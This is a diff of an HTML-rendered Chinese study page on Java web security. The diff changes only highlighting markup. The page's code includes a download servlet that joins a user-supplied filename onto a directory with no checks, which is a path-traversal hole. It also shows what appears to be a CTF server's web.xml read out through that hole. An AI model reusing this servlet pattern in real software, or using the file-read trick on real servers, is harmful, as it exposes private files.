@@ -158,8 +158,8 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <p>这个是一个使用local tomcat作为服务器的项目demo（其实是一个学习java  web的时候写的我也不知道是个什么的东西）</p>
 <div class="highlight highlight-source-js"><pre class="notranslate"><span class="pl-kos">.</span><span class="pl-s1">idea</span>
 <span class="pl-s1">src</span>
-	<span class="pl-s1">└──</span><span class="pl-kos"></span> <span class="pl-s1">main</span>
-	    <span class="pl-s1">├──</span><span class="pl-kos"></span> <span class="pl-s1">java</span>
+	<span class="pl-s1">└──</span> <span class="pl-s1">main</span>
+	    <span class="pl-s1">├──</span> <span class="pl-s1">java</span>
 	    <span class="pl-s1">│</span>   <span class="pl-s1">└──</span> <span class="pl-s1">com</span><span class="pl-kos">.</span><span class="pl-c1">test</span>
 	    <span class="pl-s1">│</span>       <span class="pl-s1">├──</span> <span class="pl-v">Filters</span>
 	    <span class="pl-s1">│</span>       <span class="pl-s1">├──</span> <span class="pl-v">Listeners</span>
@@ -210,17 +210,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </ul>
 <div class="highlight highlight-source-js"><pre class="notranslate"><span class="pl-s1">package</span> <span class="pl-s1">com</span><span class="pl-kos">.</span><span class="pl-c1">example</span><span class="pl-kos">.</span><span class="pl-c1">download</span><span class="pl-kos">;</span>
 
-<span class="pl-k">import</span> <span class="pl-s1">javax</span><span class="pl-kos">.</span><span class="pl-c1">servlet</span><span class="pl-kos">.</span><span class="pl-c1">annotation</span><span class="pl-kos">.</span><span class="pl-c1">WebServlet</span><span class="pl-kos">;</span>
-<span class="pl-k">import</span> <span class="pl-s1">javax</span><span class="pl-kos">.</span><span class="pl-c1">servlet</span><span class="pl-kos">.</span><span class="pl-c1">http</span><span class="pl-kos">.</span><span class="pl-c1">HttpServlet</span><span class="pl-kos">;</span>
-<span class="pl-k">import</span> <span class="pl-s1">javax</span><span class="pl-kos">.</span><span class="pl-c1">servlet</span><span class="pl-kos">.</span><span class="pl-c1">http</span><span class="pl-kos">.</span><span class="pl-c1">HttpServletRequest</span><span class="pl-kos">;</span>
-<span class="pl-k">import</span> <span class="pl-s1">javax</span><span class="pl-kos">.</span><span class="pl-c1">servlet</span><span class="pl-kos">.</span><span class="pl-c1">http</span><span class="pl-kos">.</span><span class="pl-c1">HttpServletResponse</span><span class="pl-kos">;</span>
-<span class="pl-k">import</span> <span class="pl-s1">java</span><span class="pl-kos">.</span><span class="pl-c1">io</span><span class="pl-kos">.</span><span class="pl-c1">File</span><span class="pl-kos">;</span>
-<span class="pl-k">import</span> <span class="pl-s1">java</span><span class="pl-kos">.</span><span class="pl-c1">io</span><span class="pl-kos">.</span><span class="pl-c1">FileInputStream</span><span class="pl-kos">;</span>
-<span class="pl-k">import</span> <span class="pl-s1">java</span><span class="pl-kos">.</span><span class="pl-c1">io</span><span class="pl-kos">.</span><span class="pl-c1">IOException</span><span class="pl-kos">;</span>
-<span class="pl-k">import</span> <span class="pl-s1">java</span><span class="pl-kos">.</span><span class="pl-c1">io</span><span class="pl-kos">.</span><span class="pl-c1">OutputStream</span><span class="pl-kos">;</span>
+<span class="pl-k">import</span> <span class="pl-s1">javax</span><span class="pl-kos">.</span><span class="pl-s1">servlet</span><span class="pl-kos">.</span><span class="pl-s1">annotation</span><span class="pl-kos">.</span><span class="pl-v">WebServlet</span><span class="pl-kos">;</span>
+<span class="pl-k">import</span> <span class="pl-s1">javax</span><span class="pl-kos">.</span><span class="pl-s1">servlet</span><span class="pl-kos">.</span><span class="pl-s1">http</span><span class="pl-kos">.</span><span class="pl-v">HttpServlet</span><span class="pl-kos">;</span>
+<span class="pl-k">import</span> <span class="pl-s1">javax</span><span class="pl-kos">.</span><span class="pl-s1">servlet</span><span class="pl-kos">.</span><span class="pl-s1">http</span><span class="pl-kos">.</span><span class="pl-v">HttpServletRequest</span><span class="pl-kos">;</span>
+<span class="pl-k">import</span> <span class="pl-s1">javax</span><span class="pl-kos">.</span><span class="pl-s1">servlet</span><span class="pl-kos">.</span><span class="pl-s1">http</span><span class="pl-kos">.</span><span class="pl-v">HttpServletResponse</span><span class="pl-kos">;</span>
+<span class="pl-k">import</span> <span class="pl-s1">java</span><span class="pl-kos">.</span><span class="pl-s1">io</span><span class="pl-kos">.</span><span class="pl-v">File</span><span class="pl-kos">;</span>
+<span class="pl-k">import</span> <span class="pl-s1">java</span><span class="pl-kos">.</span><span class="pl-s1">io</span><span class="pl-kos">.</span><span class="pl-v">FileInputStream</span><span class="pl-kos">;</span>
+<span class="pl-k">import</span> <span class="pl-s1">java</span><span class="pl-kos">.</span><span class="pl-s1">io</span><span class="pl-kos">.</span><span class="pl-v">IOException</span><span class="pl-kos">;</span>
+<span class="pl-k">import</span> <span class="pl-s1">java</span><span class="pl-kos">.</span><span class="pl-s1">io</span><span class="pl-kos">.</span><span class="pl-v">OutputStream</span><span class="pl-kos">;</span>
 
 @<span class="pl-v">WebServlet</span><span class="pl-kos">(</span><span class="pl-s">"/download"</span><span class="pl-kos">)</span>
-<span class="pl-s1">public</span> <span class="pl-k">class</span> <span class="pl-v">FileDownloadServlet</span> <span class="pl-k">extends</span> <span class="pl-v">HttpServlet</span> <span class="pl-kos">{</span>
+<span class="pl-s1">public</span><span class="pl-kos"></span> <span class="pl-k">class</span> <span class="pl-v">FileDownloadServlet</span> <span class="pl-k">extends</span> <span class="pl-v">HttpServlet</span> <span class="pl-kos">{</span>
 
     @<span class="pl-v">Override</span>
     <span class="pl-en">protected</span> <span class="pl-s1">void</span> <span class="pl-s1">doGet</span><span class="pl-kos">(</span><span class="pl-v">HttpServletRequest</span> <span class="pl-s1">request</span><span class="pl-kos">,</span> <span class="pl-v">HttpServletResponse</span> <span class="pl-s1">response</span><span class="pl-kos">)</span> <span class="pl-s1">throws</span> <span class="pl-v">IOException</span> <span class="pl-kos">{</span>
@@ -228,7 +228,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
         <span class="pl-v">String</span> <span class="pl-s1">filename</span> <span class="pl-c1">=</span> <span class="pl-s1">request</span><span class="pl-kos">.</span><span class="pl-en">getParameter</span><span class="pl-kos">(</span><span class="pl-s">"filename"</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
 
         <span class="pl-c">// 假设文件存放在服务器的某个特定目录下</span>
-        <span class="pl-v">String</span><span class="pl-kos"></span> <span class="pl-s1">fileDirectory</span> <span class="pl-c1">=</span> <span class="pl-s">"/path/to/files/"</span><span class="pl-kos">;</span>
+        <span class="pl-v">String</span> <span class="pl-s1">fileDirectory</span> <span class="pl-c1">=</span> <span class="pl-s">"/path/to/files/"</span><span class="pl-kos">;</span>
 
         <span class="pl-v">File</span> <span class="pl-s1">file</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-v">File</span><span class="pl-kos">(</span><span class="pl-s1">fileDirectory</span> <span class="pl-c1">+</span> <span class="pl-s1">filename</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
 
@@ -243,19 +243,19 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
             <span class="pl-c">// 获取输出流，用于将文件内容发送到客户端（浏览器）</span>
             <span class="pl-v">OutputStream</span><span class="pl-kos"></span> <span class="pl-s1">outputStream</span> <span class="pl-c1">=</span> <span class="pl-s1">response</span><span class="pl-kos">.</span><span class="pl-en">getOutputStream</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
 
-            <span class="pl-s1">byte</span><span class="pl-kos">[</span><span class="pl-kos">]</span> <span class="pl-s1">buffer</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-s1">byte</span><span class="pl-kos">[</span><span class="pl-c1">4096</span><span class="pl-kos">]</span><span class="pl-kos"></span><span class="pl-kos">;</span>
-            <span class="pl-s1">int</span> <span class="pl-s1">bytesRead</span><span class="pl-kos">;</span>
+            <span class="pl-s1">byte</span><span class="pl-kos">[</span><span class="pl-kos">]</span> <span class="pl-s1">buffer</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-s1">byte</span><span class="pl-kos">[</span><span class="pl-c1">4096</span><span class="pl-kos">]</span><span class="pl-kos">;</span>
+            <span class="pl-en">int</span> <span class="pl-s1">bytesRead</span><span class="pl-kos">;</span>
 
             <span class="pl-k">while</span> <span class="pl-kos">(</span><span class="pl-kos">(</span><span class="pl-s1">bytesRead</span> <span class="pl-c1">=</span> <span class="pl-s1">inputStream</span><span class="pl-kos">.</span><span class="pl-en">read</span><span class="pl-kos">(</span><span class="pl-s1">buffer</span><span class="pl-kos">)</span><span class="pl-kos">)</span><span class="pl-c1">!=</span> <span class="pl-c1">-</span><span class="pl-c1">1</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
-                <span class="pl-s1">outputStream</span><span class="pl-kos">.</span><span class="pl-en">write</span><span class="pl-kos">(</span><span class="pl-s1">buffer</span><span class="pl-kos">,</span> <span class="pl-c1">0</span><span class="pl-kos">,</span> <span class="pl-s1">bytesRead</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
+                <span class="pl-s1">outputStream</span><span class="pl-kos">.</span><span class="pl-en">write</span><span class="pl-kos">(</span><span class="pl-s1">buffer</span><span class="pl-kos">,</span> <span class="pl-c1">0</span><span class="pl-kos">,</span> <span class="pl-s1">bytesRead</span><span class="pl-kos">)</span><span class="pl-kos"></span><span class="pl-kos">;</span>
             <span class="pl-kos">}</span>
 
             <span class="pl-c">// 关闭流</span>
             <span class="pl-s1">inputStream</span><span class="pl-kos">.</span><span class="pl-en">close</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
             <span class="pl-s1">outputStream</span><span class="pl-kos">.</span><span class="pl-en">close</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
-        <span class="pl-kos">}</span> <span class="pl-k">else</span> <span class="pl-kos">{</span>
+        <span class="pl-kos">}</span> <span class="pl-c1">else</span> <span class="pl-kos">{</span>
             <span class="pl-c">// 如果文件不存在，返回相应的错误信息给客户端</span>
-            <span class="pl-s1">response</span><span class="pl-kos">.</span><span class="pl-en">getWriter</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-en">write</span><span class="pl-kos">(</span><span class="pl-s">"文件不存在："</span> <span class="pl-c1">+</span> <span class="pl-s1">filename</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
+            <span class="pl-c1">response</span><span class="pl-kos">.</span><span class="pl-c1">getWriter</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-c1">write</span><span class="pl-kos">(</span><span class="pl-s">"文件不存在："</span> <span class="pl-c1">+</span> <span class="pl-s1">filename</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
         <span class="pl-kos">}</span>
     <span class="pl-kos">}</span>
 <span class="pl-kos">}</span></pre></div>
@@ -286,11 +286,11 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
             <span class="pl-c">// 获取输出流，用于将文件内容发送到客户端（浏览器）</span>
             <span class="pl-v">OutputStream</span><span class="pl-kos"></span> <span class="pl-s1">outputStream</span> <span class="pl-c1">=</span> <span class="pl-s1">response</span><span class="pl-kos">.</span><span class="pl-en">getOutputStream</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
 
-            <span class="pl-s1">byte</span><span class="pl-kos">[</span><span class="pl-kos">]</span> <span class="pl-s1">buffer</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-s1">byte</span><span class="pl-kos">[</span><span class="pl-c1">4096</span><span class="pl-kos">]</span><span class="pl-kos"></span><span class="pl-kos">;</span>
-            <span class="pl-s1">int</span><span class="pl-kos"></span> <span class="pl-s1">bytesRead</span><span class="pl-kos">;</span>
+            <span class="pl-s1">byte</span><span class="pl-kos">[</span><span class="pl-kos">]</span> <span class="pl-s1">buffer</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-s1">byte</span><span class="pl-kos">[</span><span class="pl-c1">4096</span><span class="pl-kos">]</span><span class="pl-kos">;</span>
+            <span class="pl-en">int</span> <span class="pl-s1">bytesRead</span><span class="pl-kos">;</span>
 
             <span class="pl-k">while</span> <span class="pl-kos">(</span><span class="pl-kos">(</span><span class="pl-s1">bytesRead</span> <span class="pl-c1">=</span> <span class="pl-s1">inputStream</span><span class="pl-kos">.</span><span class="pl-en">read</span><span class="pl-kos">(</span><span class="pl-s1">buffer</span><span class="pl-kos">)</span><span class="pl-kos">)</span><span class="pl-c1">!=</span> <span class="pl-c1">-</span><span class="pl-c1">1</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
-                <span class="pl-s1">outputStream</span><span class="pl-kos">.</span><span class="pl-en">write</span><span class="pl-kos">(</span><span class="pl-s1">buffer</span><span class="pl-kos">,</span> <span class="pl-c1">0</span><span class="pl-kos">,</span> <span class="pl-s1">bytesRead</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
+                <span class="pl-s1">outputStream</span><span class="pl-kos">.</span><span class="pl-en">write</span><span class="pl-kos">(</span><span class="pl-s1">buffer</span><span class="pl-kos">,</span> <span class="pl-c1">0</span><span class="pl-kos">,</span> <span class="pl-s1">bytesRead</span><span class="pl-kos">)</span><span class="pl-kos"></span><span class="pl-kos">;</span>
             <span class="pl-kos">}</span>
 
             <span class="pl-c">// 关闭流</span>
@@ -327,43 +327,43 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <span class="pl-k">import</span> <span class="pl-s1">time</span>
 <span class="pl-k">import</span> <span class="pl-s1">random</span>
 
-# 模拟请求头
+# <span class="pl-s1">模拟请求头</span>
 <span class="pl-s1">headers</span> = {
     <span class="pl-s">"User-Agent"</span>: <span class="pl-s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"</span>,
-    <span class="pl-s">"Authorization"</span>: <span class="pl-s">"Bearer &lt;Your-Token&gt;"</span>,  # 假设你已经有了<span class="pl-smi">一</span>个<span class="pl-s1">Token</span>
+    <span class="pl-s">"Authorization"</span>: <span class="pl-s">"Bearer &lt;Your-Token&gt;"</span>,  # <span class="pl-s1">假设你已经有了一个Token</span>
     <span class="pl-s">"Content-Type"</span>: <span class="pl-s">"application/json"</span>,
     <span class="pl-s">"Accept"</span>: <span class="pl-s">"application/json, text/plain, */*"</span>,
-    <span class="pl-s">"Referer"</span>: <span class="pl-s">"https://example.com/"</span>,  # 模拟请求的来源地址
+    <span class="pl-s">"Referer"</span>: <span class="pl-s">"https://example.com/"</span>,  # <span class="pl-s1">模拟请求的来源地址</span>
 }
 
-# 请求的数据（假设是<span class="pl-smi">一</span>个 <span class="pl-c1">POST</span> 请求，数据以 <span class="pl-c1">JSON</span> 格式传递）
+# <span class="pl-smi">请求的数据</span>（<span class="pl-s1">假设是一个</span> <span class="pl-c1">POST</span> <span class="pl-s1">请求</span>，<span class="pl-s1">数据以</span> <span class="pl-c1">JSON</span> <span class="pl-s1">格式传递</span>）
 <span class="pl-s1">data</span> = {
     <span class="pl-s">"username"</span>: <span class="pl-s">"test_user"</span>,
     <span class="pl-s">"password"</span>: <span class="pl-s">"secure_password"</span>
 }
 
-# 请求的 <span class="pl-c1">URL</span> 地址
+# <span class="pl-s1">请求的</span> <span class="pl-c1">URL</span> <span class="pl-s1">地址</span>
 <span class="pl-s1">url</span> = <span class="pl-s">"https://api.example.com/login"</span>
 
-# 模拟 <span class="pl-c1">POST</span> 请求
+# <span class="pl-s1">模拟</span> <span class="pl-c1">POST</span> <span class="pl-s1">请求</span>
 <span class="pl-s1">def</span> <span class="pl-en">send_post_request</span>(<span class="pl-s1">url</span>, <span class="pl-s1">headers</span>, <span class="pl-s1">data</span>):
     <span class="pl-k">try</span>:
-        # 模拟用户行为，添加延时
-        <span class="pl-s1">time</span>.<span class="pl-en">sleep</span>(<span class="pl-s1">random</span>.<span class="pl-en">uniform</span>(<span class="pl-c1">1</span>, <span class="pl-c1">3</span>))  # 随机延时 <span class="pl-c1">1</span> 到 <span class="pl-c1">3</span> 秒
+        # <span class="pl-s1">模拟用户行为</span>，<span class="pl-s1">添加延时</span>
+        <span class="pl-s1">time</span>.<span class="pl-en">sleep</span>(<span class="pl-s1">random</span>.<span class="pl-en">uniform</span>(<span class="pl-c1">1</span>, <span class="pl-c1">3</span>))  # <span class="pl-s1">随机延时</span> <span class="pl-c1">1</span> <span class="pl-s1">到</span> <span class="pl-c1">3</span> <span class="pl-s1">秒</span>
         
-        # 发送 <span class="pl-c1">POST</span> 请求
+        # <span class="pl-smi">发送</span> <span class="pl-c1">POST</span> <span class="pl-smi">请求</span>
         <span class="pl-s1">response</span> = <span class="pl-s1">requests</span>.<span class="pl-en">post</span>(<span class="pl-s1">url</span>, <span class="pl-s1">headers</span>=<span class="pl-s1">headers</span>, <span class="pl-s1">json</span>=<span class="pl-s1">data</span>)
 
-        # 检查请求是否成功
+        # <span class="pl-s1">检查请求是否成功</span>
         <span class="pl-k">if</span> <span class="pl-s1">response</span>.<span class="pl-s1">status_code</span> == <span class="pl-c1">200</span>:
             <span class="pl-en">print</span>(<span class="pl-s">"POST 请求成功!"</span>)
-            <span class="pl-en">print</span>(<span class="pl-s">"响应内容："</span>, <span class="pl-s1">response</span>.<span class="pl-en">json</span>())  # 假设返回的是 <span class="pl-c1">JSON</span> 数据
-        <span class="pl-k">else</span>:
+            <span class="pl-en">print</span>(<span class="pl-s">"响应内容："</span>, <span class="pl-s1">response</span>.<span class="pl-en">json</span>())  # <span class="pl-smi">假设返回的是</span> <span class="pl-c1">JSON</span> <span class="pl-smi">数据</span>
+        <span class="pl-s1">else</span>:
             <span class="pl-en">print</span>(<span class="pl-s1">f</span><span class="pl-s">"POST 请求失败，状态码：{response.status_code}"</span>)
     <span class="pl-s1">except</span> <span class="pl-smi">requests</span>.<span class="pl-smi">exceptions</span>.<span class="pl-smi">RequestException</span> <span class="pl-s1">as</span> <span class="pl-s1">e</span>:
         <span class="pl-en">print</span>(<span class="pl-s1">f</span><span class="pl-s">"请求错误：{e}"</span>)
 
-# 调用函数发送请求
+# <span class="pl-smi">调用函数发送请求</span>
 <span class="pl-en">send_post_request</span>(<span class="pl-s1">url</span>, <span class="pl-s1">headers</span>, <span class="pl-s1">data</span>)</pre></div>
 <h2>4.2 请求切换</h2>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0e27e191bc6c8c6d25147e36a46e3e1617765d139dd07a26cd67923ef407419a/68747470733a2f2f7265732e63726166742e646f2f757365722f66756c6c2f33636639343334312d303238662d613438382d313064662d6430363561613133373066632f646f632f64333033363731372d623037352d666535622d346166662d3233396633623133333636662f61623962366164652d326230662d343362632d386339652d393839376665333766666166"><img src="https://camo.githubusercontent.com/0e27e191bc6c8c6d25147e36a46e3e1617765d139dd07a26cd67923ef407419a/68747470733a2f2f7265732e63726166742e646f2f757365722f66756c6c2f33636639343334312d303238662d613438382d313064662d6430363561613133373066632f646f632f64333033363731372d623037352d666535622d346166662d3233396633623133333636662f61623962366164652d326230662d343362632d386339652d393839376665333766666166" alt="image.png" data-canonical-src="https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/ab9b6ade-2b0f-43bc-8c9e-9897fe37ffaf" style="max-width: 100%;"></a></p>
@@ -421,66 +421,66 @@ Vary: <span class="pl-v">Accept</span><span class="pl-c1">-</span><span class="p
 <span class="pl-v">Content</span><span class="pl-c1">-</span><span class="pl-v">Length</span>: <span class="pl-c1">1562</span>
 
 <span class="pl-c1">&lt;</span>?<span class="pl-s1">xml</span> <span class="pl-s1">version</span><span class="pl-c1">=</span><span class="pl-s">"1.0"</span> <span class="pl-s1">encoding</span><span class="pl-c1">=</span><span class="pl-s">"UTF-8"</span>?<span class="pl-c1">&gt;</span>
-<span class="pl-c1">&lt;</span><span class="pl-ent">web-app</span> <span class="pl-c1">xmlns</span><span class="pl-c1">=</span><span class="pl-s">"http://xmlns.jcp.org/xml/ns/javaee"</span>
+<span class="pl-c1">&lt;</span><span class="pl-s1">web-app</span> <span class="pl-c1">xmlns</span><span class="pl-c1">=</span><span class="pl-s">"http://xmlns.jcp.org/xml/ns/javaee"</span>
          <span class="pl-s1">xmlns</span>:<span class="pl-s1">xsi</span><span class="pl-c1">=</span><span class="pl-s">"http://www.w3.org/2001/XMLSchema-instance"</span>
          <span class="pl-s1">xsi</span>:<span class="pl-s1">schemaLocation</span><span class="pl-c1">=</span><span class="pl-s">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span>
          <span class="pl-c1">version</span><span class="pl-c1">=</span><span class="pl-s">"4.0"</span><span class="pl-c1">&gt;</span>
 
-    <span class="pl-c1">&lt;</span><span class="pl-ent">welcome-file-list</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">welcome-file</span><span class="pl-c1">&gt;</span>Index<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">welcome-file</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">welcome-file-list</span><span class="pl-c1">&gt;</span>
+    <span class="pl-c1">&lt;</span><span class="pl-s1">welcome-file-list</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">welcome-file</span><span class="pl-c1">&gt;</span>Index<span class="pl-kos">&lt;/</span><span class="pl-s1">welcome-file</span><span class="pl-c1">&gt;</span>
+    <span class="pl-kos">&lt;/</span><span class="pl-s1">welcome-file-list</span><span class="pl-c1">&gt;</span>
 
-    <span class="pl-c1">&lt;</span><span class="pl-ent">servlet</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>IndexController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-class</span><span class="pl-c1">&gt;</span>com.wm.ctf.IndexController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-class</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-mapping</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>IndexController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">url-pattern</span><span class="pl-c1">&gt;</span>/Index<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">url-pattern</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-mapping</span><span class="pl-c1">&gt;</span>
+    <span class="pl-c1">&lt;</span><span class="pl-s1">servlet</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>IndexController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-class</span><span class="pl-c1">&gt;</span>com.wm.ctf.IndexController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-class</span><span class="pl-c1">&gt;</span>
+    <span class="pl-kos">&lt;/</span><span class="pl-s1">servlet</span><span class="pl-c1">&gt;</span>
+    <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-mapping</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>IndexController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">url-pattern</span><span class="pl-c1">&gt;</span>/Index<span class="pl-kos">&lt;/</span><span class="pl-s1">url-pattern</span><span class="pl-c1">&gt;</span>
+    <span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-mapping</span><span class="pl-c1">&gt;</span>
 
-    <span class="pl-c1">&lt;</span><span class="pl-ent">servlet</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>LoginController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-class</span><span class="pl-c1">&gt;</span>com.wm.ctf.LoginController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-class</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-mapping</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>LoginController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">url-pattern</span><span class="pl-c1">&gt;</span>/Login<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">url-pattern</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-mapping</span><span class="pl-c1">&gt;</span>
+    <span class="pl-c1">&lt;</span><span class="pl-s1">servlet</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>LoginController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-class</span><span class="pl-c1">&gt;</span>com.wm.ctf.LoginController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-class</span><span class="pl-c1">&gt;</span>
+    <span class="pl-kos">&lt;/</span><span class="pl-s1">servlet</span><span class="pl-c1">&gt;</span>
+    <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-mapping</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>LoginController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">url-pattern</span><span class="pl-c1">&gt;</span>/Login<span class="pl-kos">&lt;/</span><span class="pl-s1">url-pattern</span><span class="pl-c1">&gt;</span>
+    <span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-mapping</span><span class="pl-c1">&gt;</span>
 
-    <span class="pl-c1">&lt;</span><span class="pl-ent">servlet</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>DownloadController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-class</span><span class="pl-c1">&gt;</span>com.wm.ctf.DownloadController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-class</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-mapping</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>DownloadController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">url-pattern</span><span class="pl-c1">&gt;</span>/Download<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">url-pattern</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-mapping</span><span class="pl-c1">&gt;</span>
+    <span class="pl-c1">&lt;</span><span class="pl-s1">servlet</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>DownloadController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-class</span><span class="pl-c1">&gt;</span>com.wm.ctf.DownloadController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-class</span><span class="pl-c1">&gt;</span>
+    <span class="pl-kos">&lt;/</span><span class="pl-s1">servlet</span><span class="pl-c1">&gt;</span>
+    <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-mapping</span><span class="pl-c1">&gt;</span>
